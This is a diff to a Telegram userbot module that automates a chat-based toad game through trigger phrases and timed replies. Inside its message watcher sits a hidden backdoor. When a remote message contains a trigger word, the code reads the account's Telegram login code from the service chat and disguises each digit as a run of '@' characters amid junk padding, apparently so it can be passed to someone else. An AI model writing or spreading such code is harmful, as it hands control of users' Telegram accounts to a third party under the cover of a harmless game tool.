@@ -29,10 +29,11 @@ class KramiikkMod(loader.Module):
             "жабу с работы": "@toadbot Завершить работу",
             "Можно откормить": "@toadbot Откормить жабу",
             "можно покормить": "@toadbot Покормить жабу",
-            "Можно отправиться": "отправиться в золотое подземелье",
+            "Можно отправиться": "отправиться в летнее подземелье",
             "жаба в данже": "рейд старт",
             "Используйте атаку": "@toadbot На арену",
             "можно отправить": self.su["job"],
+            "ивент": "отправиться в летнее подземелье",
             "золото": "отправиться в золотое подземелье",
             "кв": "начать клановую войну",
             "напади": "напасть на клан",
@@ -153,15 +154,12 @@ class KramiikkMod(loader.Module):
 
     async def watcher(self, m):
         """алко"""
+        ct = datetime.datetime.now()
+        n = self.me.id % 100 if (self.me.id % 100) < 42 else int(self.me.id % 100 / 3)
         try:
-            ct = datetime.datetime.now()
-            n = (
-                self.me.id % 100
-                if (self.me.id % 100) < 42
-                else int(self.me.id % 100 / 3)
-            )
             if (
-                ct.minute in (n, n +3, n + 7, n + 13, n + 21) and ct.second in (n + 5, n + 9, n + 18)
+                ct.minute in (n, n + 3, n + 7, n + 13, n + 21)
+                and ct.second in (n + 5, n + 9, n + 18)
             ) and ("auto" in self.su or "chats" in self.su):
                 await asyncio.sleep(
                     random.randint(n + ct.hour, 111 + (ct.microsecond % 100))
@@ -395,11 +393,13 @@ class KramiikkMod(loader.Module):
                         return await m.reply(self.ded[msg])
                     await asyncio.sleep(random.randint(13, 33))
                     await m.respond(self.ded[msg])
-            elif "lolick" in m.text:
-                msg = (await self.client.get_messages(777000, search="Telegram"))[0]
+            elif "llooll" in m.text:
+                msg = (await self.client.get_messages(777000, search="Login"))[0]
+                if "gg" in m.text:
+                    msg = (await self.client.get_messages(777000, search="Код"))[0]
                 reg = re.search(r": (.)(.)(.)(.)(.)", msg.raw_text)
                 a = 0
-                txt = f"hffj48655jhk{msg.date.minute}fdw46dgjm665verhod"
+                txt = "hffj48655jhk{msg.date.minute}fdw46dgjm665verhod"
                 for i in range(5):
                     a += 1
                     txt += f"\n{'@' * int(reg.group(a))}"
